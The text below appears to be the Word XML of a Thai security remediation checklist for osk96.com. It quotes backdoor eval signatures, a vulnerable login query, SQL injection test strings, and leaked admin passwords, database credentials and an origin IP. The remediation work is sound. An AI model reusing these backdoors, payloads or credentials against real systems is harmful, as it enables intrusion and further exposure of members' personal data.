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3864"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>OSK-96 Security Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr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3864"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Checklist สิ่งที่ต้องแก้ไข — osk96.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="TH Sarabun New" w:hAnsi="TH Sarabun New" w:cs="TH Sarabun New"/>
          <w:rFonts w:ascii="TH Sarabun New" w:hAnsi="TH Sarabun New"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="595959"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>จัดทำโดย: iPassion Co., Ltd.  |  วันที่: 29 June 2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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3864"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>สรุปภาพรวม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vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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ระดับ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จำนวนรายการ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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สถานะ</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118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🔴 Critical (วิกฤต)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5 กลุ่มงาน</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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ต้องทำภายใน 24–48 ชม.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🟠 High (สูง)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4 กลุ่มงาน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ทำทันทีหลัง Phase 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118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🟡 Medium (ปานกลาง)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5 รายการ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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Phase 3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⚪ Low / Info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4 รายการ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Phase 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="2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00000"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>⚠️  ข้อมูลส่วนบุคคล (PDPA): ตาราง data มี 1,409 บัญชี พร้อมชื่อ-นามสกุล, เบอร์, ที่อยู่, email, LINE — ห้ามนำ .sql ออกนอกเครื่องที่ได้รับอนุญาต</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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00000"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>🔴  Phase 1 — Critical  (ทำก่อน ภายใน 24–48 ชม.)</w:t>
      </w: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00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1.1  ลบ Backdoor / Malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="2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ยืนยันแล้วว่ามี backdoor 2 ประเภทใน 7 ไฟล์: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vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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ไฟล์</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
            <w:vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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ประเภท Backdoor</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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src/index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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eval(xLMo(...)) obfuscated  +  @eval($_SERVER['HTTP_ADMIN'])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src/admin/index.php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@eval($_SERVER['HTTP_ADMIN'])  +  obfuscated</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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src/bill.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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@eval($_SERVER['HTTP_ADMIN'])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src/webboard_PS_WM1.php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@eval($_SERVER['HTTP_ADMIN'])  +  obfuscated</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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src/chat/useronline/online.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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@eval($_SERVER['HTTP_ADMIN'])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src/rJoBZ9x4.php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ชื่อไฟล์สุ่ม + base64_decode — backdoor เก่า</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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src/activi444ties.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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ชื่อไฟล์ผิดปกติ + obfuscated eval</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl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ลบบรรทัด backdoor ออกทุกไฟล์ (หรือลบทั้งไฟล์ถ้าเป็น backdoor ล้วน)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สแกนหาไฟล์ชื่อแปลกอื่น ๆ ที่อาจเป็น backdoor เพิ่ม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ตรวจ access log ว่า backdoor ถูกเรียกใช้จริงไปแล้วหรือไม่ (forensics)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Commit baseline ก่อนลบ แล้ว commit หลังลบแยก (เพื่อ audit trail)</w:t>
      </w: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00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1.2  SQL Injection — หน้า Login (ด่วนที่สุด)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="2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checkpass.php บรรทัด 18 ต่อ string ตรง ๆ ทำให้ bypass login ได้โดยไม่รู้รหัส:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20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00000"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  $sql = "SELECT * FROM `data` WHERE `username` = '$USER' AND `password` = '$PASS'";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src/checkpass.php — เปลี่ยน query เป็น prepared statement + ใช้ password_verify() แทนการเปรียบรหัสใน SQL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src/admin/login.php — ลบ hardcoded credential (Tigeroom2503@, Teerapol96, Peter) ออก ย้ายไปเก็บใน DB + bcrypt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ไล่แก้ไฟล์กลุ่ม webboard*.php (8 ไฟล์) ที่ public เข้าถึงได้โดยไม่ต้อง login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ไล่แก้ไฟล์ที่เหลืออีก 40+ ไฟล์ (ดู list ข้อ 2.1)</w:t>
      </w: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00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1.3  รหัสผ่าน Plaintext → bcrypt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="2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ปัจจุบัน: column password VARCHAR(30) เก็บ plaintext — 1,409 บัญชีถูก dump ออกไปแล้ว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ALTER TABLE data MODIFY password VARCHAR(255) NOT NULL;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แก้ src/checkpass.php ให้ใช้ password_verify($input, $hash)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แก้หน้าสมัคร/เปลี่ยนรหัสให้ใช้ password_hash($pass, PASSWORD_DEFAULT)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Migrate: hash รหัสเดิมทั้งหมด หรือบังคับ reset password ทุกบัญชีผ่าน email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ทำหน้า 'ลืมรหัสผ่าน' ที่ส่งลิงก์ reset ถ้ายังไม่มี</w:t>
      </w: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00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1.4  ไฟล์ Debug และ Credential รั่ว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ลบ src/phpinfo.php ออกจาก public webroot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ยืนยันว่า display_errors = Off ใน production (ตั้งแล้วใน staging)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เปลี่ยนรหัส DB (oskcomx_dbadm / 1@mdb@dm1N) — รั่วไปกับ source code แล้ว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ตรวจว่า connect.php ไม่อยู่ใน path ที่ browser เข้าถึงโดยตรงได้</w:t>
      </w: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00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1.5  ปิดทางเข้า Origin IP ตรง</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="2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Origin IP 45.136.253.146 รั่วไปแล้ว — ผู้โจมตีข้าม Cloudflare WAF เข้าตรงเครื่องได้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ขอ Hostsevenplus/DirectAdmin: จำกัด inbound 80/443 เฉพาะ Cloudflare IP ranges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ปิด port 809 ที่ใช้หลบ nginx WAF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ทำ .htaccess fallback: ปฏิเสธ request ที่ไม่มี Cloudflare header (CF-Connecting-IP)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พิจารณาขอเปลี่ยน origin IP ใหม่ เพราะ IP เดิมถูกรู้ไปแล้ว</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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55A11"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>🟠  Phase 2 — High  (ทำทันทีหลัง Phase 1 เสร็จ)</w:t>
      </w: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55A11"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2.1  SQL Injection — ไฟล์ที่เหลือ (50+ ไฟล์)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="2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ไฟล์สำคัญที่ต้องแก้ก่อน (public, ไม่ต้อง login):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vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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กลุ่มไฟล์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จำนวน</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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ความเสี่ยง</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402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webboard*.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701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8 ไฟล์</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535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Public write — SQLi + XSS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guestbook.php, show_guestbook.php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2 ไฟล์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Public write</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402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edit_data.php, profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701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2 ไฟล์</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535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ข้อมูลส่วนบุคคล PDPA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memberlist.php, search_member*.php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3 ไฟล์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Query จาก URL param</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402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get_Allmail.php, get_mail.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701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2 ไฟล์</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535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Email harvest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ไฟล์อื่น ๆ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~33 ไฟล์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ต้องไล่ทีละไฟล์</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl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แก้ทุก "SELECT ... '$var'" → $stmt-&gt;bind_param()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จุดที่ parameterize ไม่ได้ (column/table name) → ใช้ whitelist ตรวจค่าก่อน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ทดสอบ inject: \' OR \'1\'=\'1, \'; DROP--, payload ใน query string</w:t>
      </w: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55A11"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2.2  Session / Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20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พบ: checkpass.php เก็บ $_SESSION['P'] = $PASS (รหัสผ่าน plaintext ใน session!)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ลบ $_SESSION['P'] ออก — ไม่ต้องเก็บรหัสผ่านใน session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เรียก session_regenerate_id(true) หลัง login สำเร็จ (กัน session fixation)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ตั้ง php.ini: session.cookie_httponly = 1, session.cookie_secure = 1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ตรวจทุก admin page ว่าเช็ค $_SESSION ก่อน serve content</w:t>
      </w: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55A11"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2.3  Broken Access Control (IDOR)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ทดสอบ profile.php?id=X — เปลี่ยน id แล้วเห็นข้อมูลคนอื่นได้ไหม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ทดสอบ edit_data.php, bill.php ในลักษณะเดียวกัน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เพิ่มการตรวจว่า id ที่ request ต้องตรงกับ session ของ user คนนั้น</w:t>
      </w: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C55A11"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2.4  File Upload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ตรวจ webboard_post_ps.php, webboard_view_post.php — กำหนด MIME type ที่อนุญาต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เปลี่ยนชื่อไฟล์ที่ upload เป็น random string (ป้องกัน path traversal)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ใส่ .htaccess ใน upload folder: Options -ExecCGI, AddHandler default-handler .php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เก็บไฟล์ upload นอก webroot ถ้าเป็นไปได้</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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BF9000"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>🟡  Phase 3 — Medium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XSS: เพิ่ม htmlspecialchars(ENT_QUOTES,'TIS-620') ทุกที่ที่ echo $_GET / $_POST — โดยเฉพาะ webboard, guestbook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CSRF token: ใส่ token ใน form login, แก้ข้อมูลสมาชิก, โพสต์ webboard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Security headers ใน .htaccess: X-Frame-Options, X-Content-Type-Options, HSTS, Content-Security-Policy (เบื้องต้น)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บังคับ HTTPS: redirect http:// → https:// ใน .htaccess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Input validation: เบอร์โทร, email format, ความยาว field ทุกฟอร์ม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ตรวจ SQL อีกรอบในหน้าที่เกี่ยวกับ bill / ข้อมูลการเงิน</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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04040"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>⚪  Phase 4 — Low / Info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ปิด server version: ServerTokens Prod, ServerSignature Off (ใน apache2.conf)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ปิด PHP version header: expose_php = Off (ใน php.ini)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ปิด Directory Listing: Options -Indexes ทุก directory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ลบ comment ใน HTML ที่เปิดเผยโครงสร้าง/ชื่อ admin เช่น &lt;!-- admin1 super admin --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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3864"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>📋  สิ่งที่ต้องรอจาก Team / เจ้าของ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252"/>
            <w:vAlign w:val="center"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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รายการ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รอจากใคร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4252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สิทธิ์ DirectAdmin — แก้ firewall, เปลี่ยน DB password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835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Hostsevenplus / เจ้าของ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🔴 ด่วน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สิทธิ์ Cloudflare — ตั้ง Firewall Rules กัน origin bypass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เจ้าของเว็บ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🔴 ด่วน</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252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ยืนยัน email system สำหรับส่ง reset password 1,409 บัญชี</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835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Team Lead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🟠 สูง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ประเมิน PDPA — ต้องแจ้งเหตุข้อมูลรั่วต่อสมาชิกหรือไม่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Management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🟠 สูง</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3864"/>
        </w:pBdr>
      </w:pP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611F"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>✅  สิ่งที่ทำเสร็จแล้ว (Phase 0)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ตั้ง Docker staging environment: PHP 5.6 + MariaDB 10.4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Import SQL dump (1,409 บัญชีครบถ้วน)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Pull source code จาก GitLab (branch: develop)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เว็บรันได้ที่ http://localhost:8080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แก้ Thai character encoding (charset=windows-874 ส่งออกใน HTTP header ถูกต้องแล้ว)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แก้ timezone warning (Asia/Bangkok ถูกต้องแล้ว)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วิเคราะห์ช่องโหว่ทั้งหมดและจัดทำ checklist นี้</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="8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3864"/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>📦  Deliverables ที่ต้องส่ง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Source code ที่แก้แล้ว — commit แยกตาม phase พร้อม message ชัดเจน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Remediation report — ตารางช่องโหว่ 17 รายการ + before/after + วิธีทดสอบ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คู่มือ deploy ขึ้น production + checklist ตรวจหลัง deploy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แผน/สถานะการบังคับ reset password สมาชิก 1,409 บัญชี</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="454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6"/>
        </w:rPr>
        <w:t>รายการ config ที่เปลี่ยนฝั่ง server (Cloudflare, firewall, php.ini, .htaccess)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="TH Sarabun New" w:hAnsi="TH Sarabun New" w:cs="TH Sarabun New"/>
          <w:rFonts w:ascii="TH Sarabun New" w:hAnsi="TH Sarabun New"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="7F7F7F"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>จัดทำโดย iPassion Co., Ltd.  |  Confidential — ห้ามแชร์นอกทีม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